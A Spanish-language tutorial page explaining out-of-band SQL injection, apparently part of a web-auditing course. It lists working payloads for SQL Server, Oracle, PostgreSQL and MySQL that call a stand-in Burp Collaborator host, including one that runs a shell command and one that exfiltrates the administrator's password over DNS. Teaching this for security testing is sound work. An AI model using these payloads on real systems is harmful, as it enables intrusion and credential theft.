---
title: Inyección SQL fuera de banda (OAST)
description: Explicación de las inyecciones SQL fuera de banda (OAST).
layout: academia_lesson
parent: /academia/ciberseguridad/documentacion/auditorias-web/inyecciones-sql/segun-el-canal-de-comunicacion/fuera-de-banda/
author: ElStitchMalo
date: 16/12/2025
updated:
tags: [inyecciones SQL fuera de banda (OAST)]
---

En algunos entornos la consulta vulnerable se ejecuta de forma asíncrona (por ejemplo en otro hilo, mediante trabajos en background o peticiones que disparan acciones asíncronas). En ese caso, la respuesta HTTP del hilo original no refleja ni errores ni tiempos de ejecución de la consulta; por tanto, ninguna de las tecnicas de [inyección SQL ciega](../../ciegas/introduccion) funcionarán.

Si el servidor puede realizar solicitudes externas (egress), es posible provocar interacciones de red fuera de banda (por ejemplo resoluciones DNS o peticiones HTTP a un servidor controlado por el atacante) y así recibir los datos o señales en un canal separado. Esto es asíncrono: el atacante no necesita bloquear la misma petición esperando la señal; recibe el callback cuando ocurra.

Las técnicas para ejecutar una consulta DNS son específicas del tipo de base de datos que se utilice. 

### Ejemplos de ataque

Las siguientes entradas pueden utilizarse para realizar una búsqueda DNS en un dominio específico:

~~~
# Microsoft

' exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' --

'+exec+master..xp_dirtree+'//BURP-COLLABORATOR-SUBDOMAIN/a'+--
~~~
~~~
# Oracle

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual --

'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual+--

' UNION SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') --

'+UNION+SELECT+UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')+--
~~~
~~~
# PostgreSQL

' copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' --

'+copy+(SELECT+'')+to+program+'nslookup+BURP-COLLABORATOR-SUBDOMAIN'+--
~~~
~~~
#MySQL

' LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') # 

'+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')+#

' UNION SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' #

'+UNION+SELECT+...+INTO+OUTFILE+'\\\\BURP-COLLABORATOR-SUBDOMAIN\a'+#
~~~

Esto provoca que la base de datos realice una búsqueda al dominio que especifiquemos en lugar de  `BURP-COLLABORATOR-SUBDOMAIN`.

Una vez confirmada la forma de activar interacciones fuera de banda, se puede utilizar el canal fuera de banda para extraer datos de la aplicación vulnerable. Por ejemplo:

~~~
# Microsoft

' declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') --

'+declare+@p+varchar(1024)%3bset+@p%3d(SELECT+password+FROM+users+WHERE+username%3d'administrator')%3bexec('master..xp_dirtree+"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')+--
~~~

Esta entrada lee la contraseña del usuario `Administrator`, le añade un subdominio único de Colaborador y activa una búsqueda DNS. Esta búsqueda permite ver la contraseña capturada.